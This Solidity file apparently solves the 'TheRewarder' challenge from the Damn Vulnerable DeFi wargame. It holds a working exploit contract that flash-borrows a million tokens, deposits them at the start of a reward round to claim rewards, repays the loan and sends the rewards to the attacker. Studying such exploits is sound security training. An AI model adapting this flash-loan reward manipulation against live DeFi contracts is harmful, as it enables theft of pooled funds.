// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IFlashLoanerPool} from "./interfaces/IFlashLoanerPool.sol";
import {ITheRewarderPool} from "./interfaces/ITheRewarderPool.sol";
// import {IERC20} from "../.././../../lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

import "openzeppelin-contracts/access/Ownable.sol";



contract TheRewarderAttacker is Ownable{

    IERC20 public immutable rewardToken;
    IERC20 public immutable damnVulnerableToken;
    IFlashLoanerPool public  flashLoanerPool;
    ITheRewarderPool public  theRewarderPool;

    event RWTBalance(uint256 amount);
   

    /**
     * 
     * @param _rewardTokenAddress token address of RWT
     * @param _flashLoanerPoolAddres address for flashLoanPool
     * @param _damnVulnerableTokenAddress address for the dvt 
     * @param _theRewarderPoolAddress rewarder pool address
     * @param _owner the attacker EOA 
     */
    constructor(address _rewardTokenAddress, address _flashLoanerPoolAddres, address _damnVulnerableTokenAddress, address _theRewarderPoolAddress, address _owner){

        rewardToken = IERC20(_rewardTokenAddress);
        damnVulnerableToken = IERC20(_damnVulnerableTokenAddress);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPoolAddres);
        theRewarderPool = ITheRewarderPool(_theRewarderPoolAddress);
        _transferOwnership(_owner);
    }
    /**
     * @dev initiates the attack for TheRewarder challenge 
     * Process for Attack is as follows:
     *  @notice KEY point of attack is that this must occur at the start of a NEW round (in foundry I time warped to the start of a new round)
     *  1. invoke a flash loan for 1_000_000 dvt 
     *  2. deposit 1_000_000 dvt into the rewarderPool to receive 100 reward tokens 
     *  3. withdraw the 1_000_000 dvt and return it to the flashLoanerPool
     *  4. transfer the 100 reward tokens to the attacker EOA 
     */
    function initiateAttack() external onlyOwner {
        // initiates the flashloan 
        flashLoanerPool.flashLoan(1_000_000e18);

        // when attack is complete send 100e18 to attacker EOA 
        emit RWTBalance(rewardToken.balanceOf(address(this)));
        rewardToken.transfer(owner(), rewardToken.balanceOf(address(this)));

    }


    function transferRewardToOwner () external onlyOwner{
        
        emit RWTBalance(rewardToken.balanceOf(address(this)));

        rewardToken.transfer(owner(), rewardToken.balanceOf(address(this)));
    }
    
    /**
     * @dev facilitates performing action (in this case exploit theRewarerPool) and then return the received amount 
     * @param amount the amount will be how much the flashloan is sending
     */
    function receiveFlashLoan(uint256 amount) external {
       
        // this contract approves the rewarderPool the ability to transfer 1_000_000e18 dvt 
        damnVulnerableToken.approve(address(theRewarderPool), amount);

        // deposits 1_000_000e18 dvt to receive 100 reward tokens from rewarder pull 
        theRewarderPool.deposit(amount);

   
        // withdraws 1_000_000e18 dvt to return to the flashLoanerPool
        theRewarderPool.withdraw(amount);

        // this contract transfers the 1_000_000 back to the flashLoanerPool
        damnVulnerableToken.transfer(address(flashLoanerPool), amount);

    }

}